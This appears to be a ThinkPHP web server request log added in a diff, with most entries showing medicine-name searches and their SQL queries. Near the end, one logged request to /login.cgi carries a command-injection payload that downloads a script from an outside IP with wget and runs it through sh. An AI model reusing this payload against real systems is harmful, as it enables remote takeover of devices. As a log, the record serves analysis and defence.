+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:13:41+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000090s ]
+
+[ 2018-07-04T11:13:42+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000132s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:13:42+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000110s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:13:42+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000037s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000083s ]
+
+[ 2018-07-04T11:13:43+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:13:45+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+SQL: select * from md_medicine where medicine_name like '%楔线%' and isdel=1 [ RunTime:0.0093s ]
+
+[ 2018-07-04T11:13:45+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+SQL: select * from md_medicine where medicine_name like '%楔线%' and isdel=1 [ RunTime:0.0092s ]
+
+[ 2018-07-04T11:15:19+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000050s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000100s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000087s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000122s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:15:20+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000080s ]
+
+[ 2018-07-04T11:15:21+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+SQL: select * from md_medicine where medicine_name like '%曲面%' and isdel=1 [ RunTime:0.0097s ]
+
+[ 2018-07-04T11:15:21+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000098s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+SQL: select * from md_medicine where medicine_name like '%曲面%' and isdel=1 [ RunTime:0.0092s ]
+
+[ 2018-07-04T11:15:25+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000132s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:15:47+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:15:47+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:15:47+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000122s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:15:47+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:15:48+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000106s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000031s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000081s ]
+SQL: select * from md_medicine where medicine_name like '%全%' and isdel=1 [ RunTime:0.0093s ]
+
+[ 2018-07-04T11:15:48+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000078s ]
+SQL: select * from md_medicine where medicine_name like '%全%' and isdel=1 [ RunTime:0.0093s ]
+
+[ 2018-07-04T11:15:48+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000124s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000079s ]
+SQL: select * from md_medicine where medicine_name like '%全%' and isdel=1 [ RunTime:0.0098s ]
+
+[ 2018-07-04T11:15:49+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000045s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000101s ]
+SQL: select * from md_medicine where medicine_name like '%全%' and isdel=1 [ RunTime:0.0101s ]
+
+[ 2018-07-04T11:15:49+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000106s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000032s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000077s ]
+SQL: select * from md_medicine where medicine_name like '%全%' and isdel=1 [ RunTime:0.0098s ]
+
+[ 2018-07-04T11:15:49+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000082s ]
+SQL: select * from md_medicine where medicine_name like '%全口%' and isdel=1 [ RunTime:0.0096s ]
+
+[ 2018-07-04T11:15:49+08:00 ] 1.192.65.221 /word/findMedicine
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000030s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000073s ]
+SQL: select * from md_medicine where medicine_name like '%全口%' and isdel=1 [ RunTime:0.0090s ]
+
+[ 2018-07-04T11:24:45+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+
+[ 2018-07-04T14:23:10+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000128s ]
+
+[ 2018-07-04T14:54:08+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000126s ]
+
+[ 2018-07-04T14:55:54+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000124s ]
+
+[ 2018-07-04T14:55:59+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+
+[ 2018-07-04T14:56:03+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+
+[ 2018-07-04T14:56:25+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+
+[ 2018-07-04T14:56:29+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000113s ]
+
+[ 2018-07-04T14:57:10+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+
+[ 2018-07-04T18:16:23+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+
+[ 2018-07-04T23:02:38+08:00 ] 64.246.165.190 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000119s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000041s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000095s ]
+ERR: 无法加载控制器:Robots
+
+[ 2018-07-04T23:03:39+08:00 ] 168.196.105.94 /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000131s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000090s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000049s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000104s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001485s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001543s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000084s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000034s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000084s ]
+
